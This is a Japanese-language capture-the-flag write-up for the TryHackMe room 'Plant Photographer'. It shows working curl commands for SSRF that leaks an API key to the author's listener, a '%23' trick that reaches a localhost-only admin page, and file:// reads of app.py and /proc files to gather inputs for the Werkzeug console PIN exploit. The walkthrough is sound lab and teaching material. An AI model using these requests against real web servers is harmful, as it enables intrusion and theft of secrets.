# Plant Photographer CTF

https://tryhackme.com/room/plantphotographer

## Enumeration

```shell
TARGET=10.145.161.57
sudo bash -c "echo $TARGET   plant.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 63
```

```sh
root@ip-10-145-108-213:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.145.161.57
+ Target Hostname:    plant.thm
+ Target Port:        80
+ Start Time:         2026-03-28 00:41:30 (GMT0)
---------------------------------------------------------------------------
+ Server: Werkzeug/0.16.0 Python/3.10.7
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, OPTIONS, HEAD 
+ OSVDB-3092: /console: This might be interesting...
+ 1707 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-03-28 00:41:34 (GMT0) (4 seconds)
---------------------------------------------------------------------------
```

トップページに表示されているメールアドレス

```
Email: jay@thm.thm
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

+ http://10.145.161.57/admin (CODE:200|SIZE:48)                                                                           
+ http://10.145.161.57/console (CODE:200|SIZE:1985)                                                                       
+ http://10.145.161.57/download (CODE:200|SIZE:20) 
```

/download は下記のように使われている。

http://plant.thm/download?server=secure-file-storage.com:8087&id=75482342

## /download

```sh
$ curl -v 'http://plant.thm/download?server=192.168.128.106:8000&id=75482342'
* Host plant.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.145.161.57
*   Trying 10.145.161.57:80...
* Connected to plant.thm (10.145.161.57) port 80
* using HTTP/1.x
> GET /download?server=192.168.128.106:8000&id=75482342 HTTP/1.1
> Host: plant.thm
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: application/pdf
< Content-Length: 335
< Content-Disposition: attachment
< Server: Werkzeug/0.16.0 Python/3.10.7
< Date: Sat, 28 Mar 2026 00:53:54 GMT
< 
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
* shutting down connection #0
```

リクエストが来たが、APIキーは出ていない。

```sh
$ python -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.145.161.57 - - [27/Mar/2026 20:53:54] code 404, message File not found
10.145.161.57 - - [27/Mar/2026 20:53:54] "GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1" 404 -
```

HTTPリクエストヘッダーを表示するサーバーを起動。キー取得成功。

```sh
$ python ./myserver.py
Serving on port 8000...
Request Headers:
Host: 192.168.128.106:8000
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{[REDACTED]}
10.145.161.57 - - [27/Mar/2026 20:57:53] "GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1" 200 -
```

## /admin

/adminにアクセスすると、localhostからのみアクセスできると表示される。

```
Admin interface only available from localhost!!!
```

SSTFで/adminを指定すると、デバッグのコールスタックが表示された。

```sh
curl -v 'http://plant.thm/download?server=localhost/admin&id=75482342'
```

```python
File "/usr/src/app/app.py", line 31, in download
        response_buf = BytesIO()
        crl = pycurl.Curl()
        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
        crl.setopt(crl.WRITEDATA, response_buf)
        crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{[REDACTED]}'])
Open an interactive python shell in this frame        crl.perform()
        crl.close()
        file_data = response_buf.getvalue()
 
        resp = Response(file_data)
        resp.headers['Content-Type'] = 'application/pdf'
```

自分宛てに %23 を付けて送ると /admin がリクエストされている。

```sh
$ curl -v 'http://plant.thm/download?id=75482342&server=192.168.128.106/admin%23' 
```

```sh
10.145.184.181 - - [28/Mar/2026 00:18:43] code 404, message File not found
10.145.184.181 - - [28/Mar/2026 00:18:43] "GET /admin HTTP/1.1" 404 -
```

しかし、localhost/admin へリクエストさせると例外のコールスタックが表示される。  
例外の内容は、`pycurl.error: (7, 'Failed to connect to localhost port 80 after 0 ms: Connection refused')`

```sh
$ curl -v 'http://plant.thm/download?id=75482342&server=localhost/admin%23' 
```

/admin ではなく / でも同じ。

```sh
http://plant.thm/download?id=75482342&server=localhost/%23
```

こういう動作として考えられるのは、WebサーバーがDockerコンテナになっていて、ホストの80ポートにアクセスしたらコンテナに割り振られて、コンテナの内部的には80ポート以外で稼働しているというパターン。

ポートが不明なのでファジングする。

```sh
ffuf -u 'http://plant.thm/download?id=75482342&server=localhost:FUZZ/%23' -w ./ports.txt -fs 2811
```

しかし、重すぎてすぐにWebが無反応になり判明しなかった。

Webとストレージサービスが同じポートである可能性に気づいた。何らかのバイナリデータが返った。  
バイナリファイルとして保存したらPDFファイルで、開いたらフラグが記載されていた。

```sh
$ curl 'http://plant.thm/download?id=75482342&server=127.0.0.1:8087/admin%23'               
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal 
Warning: anyway, or consider "--output <FILE>" to save to a file.
```

## Flag3

最後の設問

```
What flag is stored in a text file in the server's web directory? 
```

下記のパスでPDFにアクセスできる。

```sh
$ curl 'http://plant.thm/download?id=75482342&server=127.0.0.1:8087/public-docs-k057230990384293/75482342.pdf%23'
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal 
Warning: anyway, or consider "--output <FILE>" to save to a file.

$ curl 'http://plant.thm/download?id=75482342&server=127.0.0.1:8087/public-docs-k057230990384293/../public-docs-k057230990384293/75482342.pdf%23'
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal 
Warning: anyway, or consider "--output <FILE>" to save to a file.
```

この要領で app.py を取ろうとしたが失敗。

```sh
$ curl 'http://plant.thm/download?id=75482342&server=127.0.0.1:8087/public-docs-k057230990384293/../app.py%23'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>

$ curl 'http://plant.thm/download?id=75482342&server=127.0.0.1:8087/public-docs-k057230990384293/../../app.py%23'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>

$ curl 'http://plant.thm/download?id=75482342&server=127.0.0.1:8087/public-docs-k057230990384293/../../../app.py%23'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

コールスタックに出ていたファイルパスを使用して、app.py を取得できた。  
あとはテキストファイルのパスが分かればこの方法で取得できるはず。

```sh
$ curl 'http://plant.thm/download?id=75482342&server=file:///usr/src/app/app.py%23'
import os
import pycurl
from io import BytesIO
from flask import Flask, send_from_directory, render_template, request, redirect, url_for, Response

app = Flask(__name__, static_url_path='/static')
...
```

## PINコード

/console が有効でLFIの脆弱性があるので、[PINコードの計算](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html#werkzeug-console-pin-exploit)を目指す。

```sh
$ cat cmdline
/usr/local/bin/python/usr/src/app/app.py 
```

```sh
$ cat environ
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=77c09e05c4a9LANG=C.UTF-8GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DPYTHON_VERSION=3.10.7PYTHON_PIP_VERSION=22.2.2PYTHON_SETUPTOOLS_VERSION=63.2.0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/5eaac1050023df1f5c98b173b248c260023f2278/public/get-pip.pyPYTHON_GET_PIP_SHA256=5aefe6ade911d997af080b315ebcb7f882212d070465df544e1175ac2be519b4HOME=/rootWERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true
```

```sh
$ curl 'http://plant.thm/download?id=75482342&server=file:///proc/sys/kernel/random/boot_id%23'
9b8ab2d5-879d-494a-b198-9874baa63024

$ curl 'http://plant.thm/download?id=75482342&server=file:///proc/self/cgroup%23'                
12:hugetlb:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
11:net_cls,net_prio:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
10:pids:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
9:memory:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
8:rdma:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
7:freezer:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
6:blkio:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
5:cpu,cpuacct:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
4:devices:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
3:cpuset:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
2:perf_event:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
1:name=systemd:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
0::/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca

$ curl 'http://plant.thm/download?id=75482342&server=file:///sys/class/net/eth0/address%23'                 
02:42:ac:14:00:02
```

Webですぐに出てくるPIN生成コードでは一致せず、かなり苦労した。  
WerkzeugのバージョンやPIN生成アルゴリズムを調べる必要があった。

## 振り返り

- リリースボーナス50%ゲット！
- SSRFで、# を付加するテクニックは良い学び。
- WerkzeugコンソールとLFIが有効なときPIN生成できるということを、たまたま数日前に知ったばかりで実践したのは今回が初めて。非常に良い練習になった。

## Tags

#tags:SSRF #tags:LFI #tags:Werkzeug
